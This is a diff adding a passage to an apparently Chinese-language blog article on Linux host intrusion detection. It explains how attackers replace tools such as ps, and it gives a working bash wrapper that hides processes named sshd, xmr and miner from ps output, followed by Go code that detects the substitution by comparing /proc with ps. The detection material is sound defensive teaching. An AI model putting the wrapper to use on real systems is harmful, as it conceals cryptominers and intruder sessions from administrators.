@@ -153,6 +153,174 @@ func<span class="w"> </span>checkLDPreloadConfig<span class="o">()</span><span c
 <span class="w">    </span><span class="k">return</span><span class="w"> </span>len<span class="o">(</span>suspiciousFiles<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>suspiciousFiles
 <span class="o">}</span>
 </code></pre></div>
+<p>替换关键系统工具和二进制文件：通过替换常用的系统命令如 ls, ps, netstat 等，使得这些命令在被执行时隐藏特定的信息，例如隐藏特定的文件、进程或网络连接。 这个是一个bash 包装的ps 命令， 可以过滤掉指定进程， 只要把原ps 重命令ps1（可以是其他的字符，只要一致就行）即可。</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="c1"># Default list of processes to exclude (you can add more process names here)</span>
+<span class="nv">EXCLUDE_PROCESSES</span><span class="o">=(</span><span class="s2">"sshd"</span><span class="w"> </span><span class="s2">"xmr"</span><span class="w"> </span><span class="s2">"miner"</span><span class="o">)</span>
+
+<span class="c1"># Parse options and arguments</span>
+<span class="nv">PS_ARGS</span><span class="o">=()</span>
+<span class="nv">EXCLUDE_FLAG</span><span class="o">=</span><span class="nb">true</span>
+
+<span class="k">while</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-gt<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="k">in</span>
+<span class="w">        </span>--exclude<span class="o">)</span>
+<span class="w">            </span><span class="nv">EXCLUDE_FLAG</span><span class="o">=</span><span class="nb">true</span>
+<span class="w">            </span><span class="nb">shift</span><span class="w"> </span><span class="c1"># Skip the --exclude argument</span>
+<span class="w">            </span><span class="p">;;</span>
+<span class="w">        </span>*<span class="o">)</span>
+<span class="w">            </span><span class="nv">PS_ARGS</span><span class="o">+=(</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="o">)</span><span class="w"> </span><span class="c1"># Collect all other arguments</span>
+<span class="w">            </span><span class="nb">shift</span>
+<span class="w">            </span><span class="p">;;</span>
+<span class="w">    </span><span class="k">esac</span>
+<span class="k">done</span>
+
+<span class="c1"># If no arguments are passed, default to 'aux'</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${#</span><span class="nv">PS_ARGS</span><span class="p">[@]</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="nv">PS_ARGS</span><span class="o">=(</span><span class="s2">"aux"</span><span class="o">)</span>
+<span class="k">fi</span>
+
+<span class="c1"># Execute the ps command and pipe its output to grep</span>
+ps1<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">PS_ARGS</span><span class="p">[@]</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$EXCLUDE_FLAG</span><span class="s2">"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="c1"># Build the grep exclusion pattern</span>
+<span class="w">        </span><span class="nv">exclude_pattern</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s2">"|%s"</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">EXCLUDE_PROCESSES</span><span class="p">[@]</span><span class="si">}</span><span class="s2">"</span><span class="k">)</span>
+<span class="w">        </span><span class="nv">exclude_pattern</span><span class="o">=</span><span class="si">${</span><span class="nv">exclude_pattern</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="w"> </span><span class="c1"># Remove the leading '|'</span>
+
+<span class="w">        </span><span class="c1"># Use grep to exclude specific process names</span>
+<span class="w">        </span>grep<span class="w"> </span>-vE<span class="w"> </span><span class="s2">"</span><span class="nv">$exclude_pattern</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">else</span>
+<span class="w">        </span><span class="c1"># Directly output the ps result</span>
+<span class="w">        </span>cat
+<span class="w">    </span><span class="k">fi</span>
+<span class="o">}</span>
+</code></pre></div>
+<p>检测 ps 命令有没有被替换, 遍历proc 和 ps 执行结果对比， 代码如下 ：</p>
+<div class="highlight"><pre><span></span><code>func<span class="w"> </span>getProcProcesses<span class="o">(</span>minAge<span class="w"> </span>time.Duration<span class="o">)</span><span class="w"> </span><span class="o">(</span>*ProcessMap,<span class="w"> </span>error<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>procMap<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>NewProcessMap<span class="o">()</span>
+<span class="w">    </span>files,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>ioutil.ReadDir<span class="o">(</span><span class="s2">"/proc"</span><span class="o">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>nil,<span class="w"> </span>fmt.Errorf<span class="o">(</span><span class="s2">"error reading /proc: %v"</span>,<span class="w"> </span>err<span class="o">)</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>now<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>time.Now<span class="o">()</span>.Unix<span class="o">()</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span>_,<span class="w"> </span>f<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>range<span class="w"> </span>files<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>!f.IsDir<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>pid,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>f.Name<span class="o">())</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>startTime,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>getProcessStartTime<span class="o">(</span>pid<span class="o">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>//<span class="w"> </span>Skip<span class="w"> </span>processes<span class="w"> </span>running<span class="w"> </span><span class="k">for</span><span class="w"> </span>less<span class="w"> </span>than<span class="w"> </span>minAge
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>now-startTime<span class="w"> </span>&lt;<span class="w"> </span>int64<span class="o">(</span>minAge.Seconds<span class="o">())</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>statusFile<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>filepath.Join<span class="o">(</span><span class="s2">"/proc"</span>,<span class="w"> </span>f.Name<span class="o">()</span>,<span class="w"> </span><span class="s2">"status"</span><span class="o">)</span>
+<span class="w">        </span>content,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>ioutil.ReadFile<span class="o">(</span>statusFile<span class="o">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>info<span class="w"> </span>:<span class="o">=</span><span class="w"> </span><span class="p">&amp;</span>ProcessInfo<span class="o">{</span>
+<span class="w">            </span>PID:<span class="w">       </span>pid,
+<span class="w">            </span>StartTime:<span class="w"> </span>startTime,
+<span class="w">            </span>CmdLine:<span class="w">   </span>getCmdLine<span class="o">(</span>pid<span class="o">)</span>,
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>lines<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.Split<span class="o">(</span>string<span class="o">(</span>content<span class="o">)</span>,<span class="w"> </span><span class="s2">"\n"</span><span class="o">)</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span>_,<span class="w"> </span>line<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>range<span class="w"> </span>lines<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span>switch<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span>strings.HasPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"Name:"</span><span class="o">)</span>:
+<span class="w">                </span>info.Name<span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.TrimSpace<span class="o">(</span>strings.TrimPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"Name:"</span><span class="o">))</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span>strings.HasPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"PPid:"</span><span class="o">)</span>:
+<span class="w">                </span>info.PPID,<span class="w"> </span><span class="nv">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>strings.TrimSpace<span class="o">(</span>strings.TrimPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"PPid:"</span><span class="o">)))</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span>strings.HasPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"Uid:"</span><span class="o">)</span>:
+<span class="w">                </span>uidFields<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>strings.TrimPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"Uid:"</span><span class="o">))</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>uidFields<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                    </span>info.UID,<span class="w"> </span><span class="nv">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>uidFields<span class="o">[</span><span class="m">0</span><span class="o">])</span>
+<span class="w">                </span><span class="o">}</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span>strings.HasPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"State:"</span><span class="o">)</span>:
+<span class="w">                </span>stateParts<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>strings.TrimPrefix<span class="o">(</span>line,<span class="w"> </span><span class="s2">"State:"</span><span class="o">))</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>stateParts<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                    </span>info.State<span class="w"> </span><span class="o">=</span><span class="w"> </span>string<span class="o">(</span>stateParts<span class="o">[</span><span class="m">0</span><span class="o">][</span><span class="m">0</span><span class="o">])</span>
+<span class="w">                </span><span class="o">}</span>
+<span class="w">            </span><span class="o">}</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>procMap.Add<span class="o">(</span>pid,<span class="w"> </span>info<span class="o">)</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>procMap,<span class="w"> </span>nil
+<span class="o">}</span>
+
+//<span class="w"> </span>getPsProcesses<span class="w"> </span>retrieves<span class="w"> </span>process<span class="w"> </span>information<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>ps<span class="w"> </span><span class="nb">command</span>
+func<span class="w"> </span>getPsProcesses<span class="o">(</span>minAge<span class="w"> </span>time.Duration<span class="o">)</span><span class="w"> </span><span class="o">(</span>*ProcessMap,<span class="w"> </span>error<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>procMap<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>NewProcessMap<span class="o">()</span>
+
+<span class="w">    </span>//<span class="w"> </span>Use<span class="w"> </span>ps<span class="w"> </span><span class="nb">command</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>more<span class="w"> </span>detailed<span class="w"> </span>information,<span class="w"> </span>including<span class="w"> </span>start<span class="w"> </span><span class="nb">time</span>
+<span class="w">    </span>cmd<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>exec.Command<span class="o">(</span><span class="s2">"ps"</span>,<span class="w"> </span><span class="s2">"ax"</span>,<span class="w"> </span><span class="s2">"-o"</span>,<span class="w"> </span><span class="s2">"pid,ppid,uid,stat,lstart,comm"</span><span class="o">)</span>
+<span class="w">    </span>output,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>cmd.Output<span class="o">()</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>nil,<span class="w"> </span>fmt.Errorf<span class="o">(</span><span class="s2">"error executing ps command: %v"</span>,<span class="w"> </span>err<span class="o">)</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>now<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>time.Now<span class="o">()</span>
+<span class="w">    </span>scanner<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>bufio.NewScanner<span class="o">(</span>strings.NewReader<span class="o">(</span>string<span class="o">(</span>output<span class="o">)))</span>
+<span class="w">    </span>scanner.Scan<span class="o">()</span><span class="w"> </span>//<span class="w"> </span>Skip<span class="w"> </span>header<span class="w"> </span>line
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span>scanner.Scan<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>fields<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>scanner.Text<span class="o">())</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>fields<span class="o">)</span><span class="w"> </span>&lt;<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>pid,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>fields<span class="o">[</span><span class="m">0</span><span class="o">])</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>//<span class="w"> </span>Parse<span class="w"> </span>start<span class="w"> </span><span class="nb">time</span>
+<span class="w">        </span>timeStr<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.Join<span class="o">(</span>fields<span class="o">[</span><span class="m">4</span>:9<span class="o">]</span>,<span class="w"> </span><span class="s2">" "</span><span class="o">)</span>
+<span class="w">        </span>startTime,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>time.Parse<span class="o">(</span><span class="s2">"Mon Jan 2 15:04:05 2006"</span>,<span class="w"> </span>timeStr<span class="o">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>//<span class="w"> </span>Skip<span class="w"> </span>processes<span class="w"> </span>running<span class="w"> </span><span class="k">for</span><span class="w"> </span>less<span class="w"> </span>than<span class="w"> </span>minAge
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>now.Sub<span class="o">(</span>startTime<span class="o">)</span><span class="w"> </span>&lt;<span class="w"> </span>minAge<span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>ppid,<span class="w"> </span>_<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>fields<span class="o">[</span><span class="m">1</span><span class="o">])</span>
+<span class="w">        </span>uid,<span class="w"> </span>_<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>fields<span class="o">[</span><span class="m">2</span><span class="o">])</span>
+
+<span class="w">        </span>info<span class="w"> </span>:<span class="o">=</span><span class="w"> </span><span class="p">&amp;</span>ProcessInfo<span class="o">{</span>
+<span class="w">            </span>PID:<span class="w">       </span>pid,
+<span class="w">            </span>PPID:<span class="w">      </span>ppid,
+<span class="w">            </span>UID:<span class="w">       </span>uid,
+<span class="w">            </span>State:<span class="w">     </span>string<span class="o">(</span>fields<span class="o">[</span><span class="m">3</span><span class="o">][</span><span class="m">0</span><span class="o">])</span>,
+<span class="w">            </span>StartTime:<span class="w"> </span>startTime.Unix<span class="o">()</span>,
+<span class="w">            </span>Name:<span class="w">      </span>fields<span class="o">[</span>len<span class="o">(</span>fields<span class="o">)</span>-1<span class="o">]</span>,
+<span class="w">            </span>CmdLine:<span class="w">   </span>getCmdLine<span class="o">(</span>pid<span class="o">)</span>,
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>procMap.Add<span class="o">(</span>pid,<span class="w"> </span>info<span class="o">)</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>procMap,<span class="w"> </span>nil
+<span class="o">}</span>
+</code></pre></div>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
